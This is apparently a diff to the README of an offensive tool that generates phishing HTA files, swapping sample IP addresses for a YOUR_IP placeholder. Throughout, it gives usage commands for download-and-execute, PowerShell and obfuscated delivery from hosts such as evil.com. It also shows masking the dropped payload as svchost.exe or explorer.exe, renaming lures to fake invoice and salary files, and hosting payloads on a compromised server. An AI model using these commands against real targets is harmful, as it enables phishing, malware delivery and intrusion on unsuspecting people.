@@ -68,12 +68,12 @@ chmod +x hta_generator.py
 
 **Command-Line Mode:**
 ```bash
-./hta_generator.py -m 1 -H 192.168.1.100 -f loader.exe -o phish.hta
+./hta_generator.py -m 1 -H YOUR_IP -f loader.exe -o phish.hta
 ```
 
 **Generate All Methods:**
 ```bash
-./hta_generator.py -m 5 -H 192.168.1.100 -f loader.exe -l ./loader.exe
+./hta_generator.py -m 5 -H YOUR_IP -f loader.exe -l ./loader.exe
 ```
 
 ---
@@ -116,13 +116,13 @@ chmod +x hta_generator.py
 
 ```bash
 # Basic
-./hta_generator.py -m 1 -H 192.168.1.100 -f loader.exe -o download.hta
+./hta_generator.py -m 1 -H YOUR_IP -f loader.exe -o download.hta
 
 # With HTTPS
 ./hta_generator.py -m 1 -H https://evil.com -f update.exe
 
 # Custom dropped name
-./hta_generator.py -m 1 -H 10.10.10.5 -f payload.exe -e svchost.exe
+./hta_generator.py -m 1 -H YOUR_IP -f payload.exe -e svchost.exe
 ```
 
 ### Method 2: Embedded Base64
@@ -139,7 +139,7 @@ chmod +x hta_generator.py
 
 ```bash
 # Basic
-./hta_generator.py -m 3 -H 192.168.1.100 -f loader.exe -o ps.hta
+./hta_generator.py -m 3 -H YOUR_IP -f loader.exe -o ps.hta
 
 # HTTPS
 ./hta_generator.py -m 3 -H https://updates.evil.com -f KB5034441.exe
@@ -149,7 +149,7 @@ chmod +x hta_generator.py
 
 ```bash
 # Basic
-./hta_generator.py -m 4 -H 192.168.1.100 -f loader.exe -o obf.hta
+./hta_generator.py -m 4 -H YOUR_IP -f loader.exe -o obf.hta
 
 # Production
 ./hta_generator.py -m 4 -H https://cdn.company.com -f installer.exe -e setup.exe
@@ -159,7 +159,7 @@ chmod +x hta_generator.py
 
 ```bash
 # Create all 4 HTAs
-./hta_generator.py -m 5 -H 192.168.1.100 -f loader.exe -l ./loader.exe
+./hta_generator.py -m 5 -H YOUR_IP -f loader.exe -l ./loader.exe
 ```
 
 ---
@@ -180,7 +180,7 @@ mv Invoice_Q4_2024.hta "URGENT_Invoice_Payment_Due.hta"
 
 ```bash
 # Quick deployment during engagement
-./hta_generator.py -m 3 -H 10.10.10.5 -f payload.exe -e svchost.exe -o update.hta -q
+./hta_generator.py -m 3 -H YOUR_IP -f payload.exe -e svchost.exe -o update.hta -q
 
 # Host on compromised server
 python3 -m http.server 80
@@ -190,7 +190,7 @@ python3 -m http.server 80
 
 ```bash
 # Generate all methods
-./hta_generator.py -m 5 -H 192.168.1.100 -f update.exe -l ./loader.exe -e explorer.exe
+./hta_generator.py -m 5 -H YOUR_IP -f update.exe -l ./loader.exe -e explorer.exe
 
 # Rename for social engineering
 mv 1_download_execute.hta "Salary_Information_2024.hta"
@@ -333,7 +333,7 @@ For Sliver questions:
 ./hta_generator.py
 
 # Download method
-./hta_generator.py -m 1 -H 192.168.1.100 -f loader.exe
+./hta_generator.py -m 1 -H YOUR_IP -f loader.exe
 
 # Embedded method
 ./hta_generator.py -m 2 -l ./loader.exe
@@ -342,7 +342,7 @@ For Sliver questions:
 ./hta_generator.py -m 3 -H https://evil.com -f update.exe
 
 # Generate all
-./hta_generator.py -m 5 -H 192.168.1.100 -f loader.exe -l ./loader.exe
+./hta_generator.py -m 5 -H YOUR_IP -f loader.exe -l ./loader.exe
 
 # Help
 ./hta_generator.py -h
